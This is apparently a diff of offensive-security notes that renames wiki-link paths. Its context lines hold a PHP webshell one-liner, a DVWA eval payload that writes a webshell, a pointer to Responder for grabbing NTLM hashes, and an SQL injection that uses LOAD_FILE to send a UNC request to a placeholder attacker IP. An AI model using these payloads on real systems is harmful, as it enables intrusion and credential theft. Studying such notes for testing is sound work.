@@ -255,7 +255,7 @@ $ echo -n "<?php system(\$_GET['cmd']); ?>" | od -A n -t x1 -v | tr -d " \n" | s
 
 ##### 4.2.5.1.2 - Uploader
 
-You can use a file uploader that allows you to upload anything such as custom [[Tactics && Techniques && Procedures (TTPs) Phases/B - Initial Access/Callback Shells/Webshells/Webshells|webshells]].
+You can use a file uploader that allows you to upload anything such as custom [[Tactics && Techniques && Procedures (TTPs) Phases/C - Initial Access/Callback Shells/Webshells/Webshells|webshells]].
 
 `$ cat uploader.php`
 
@@ -383,7 +383,7 @@ http://dvwa.local/dvwa/eval_php.php?evaluate=if(file_put_contents('webshell.php'
 
 TODO: Check the links in the references to check other ways to exploit UNC paths.
 
-- Run [[Tactics && Techniques && Procedures (TTPs) Phases/B - Initial Access/Sniffing and Spoofing/Passive/Responder|Responder]] to grab the NTLM hashes.
+- Run [[Tactics && Techniques && Procedures (TTPs) Phases/C - Initial Access/Sniffing and Spoofing/Passive/Responder|Responder]] to grab the NTLM hashes.
 
 ```sql
 ' UNION SELECT NULL, LOAD_FILE('\\\\<attacker_IP>\\snare.txt')#
